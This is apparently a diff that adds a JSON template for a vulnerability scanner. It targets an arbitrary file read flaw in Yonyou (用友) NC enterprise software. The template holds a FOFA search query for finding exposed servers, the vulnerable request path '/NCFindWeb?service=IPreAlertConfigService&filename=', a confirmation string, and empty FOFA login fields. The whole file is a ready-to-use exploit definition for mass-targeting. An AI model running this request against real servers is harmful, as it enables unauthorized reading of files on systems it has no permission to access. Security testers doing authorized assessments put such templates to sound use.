@@ -1,0 +1,39 @@
+ {
+
+    "name": "用友NC 任意文件读取",
+
+    "fofa":"app=\"用友-UFIDA-NC\"",
+
+    "confirm": ".jsp",
+
+    "proxies":"",
+
+    "request": {
+
+        "method": "get",
+
+        "url": "/NCFindWeb?service=IPreAlertConfigService&filename=",
+
+        "headers": {
+
+                "referer": "",
+
+                "User-Agent": "",
+
+                "X-Forwarded-For": ""
+
+            },
+
+        "data": ""
+
+    },
+
+    "fofa_login_url":"https://i.nosec.org/login?service=https://fofa.info/f_login",
+    
+    "fofa_username":"",
+
+    "fofa_password":"",
+
+    "fofa_errormsg":"提示"
+}
+
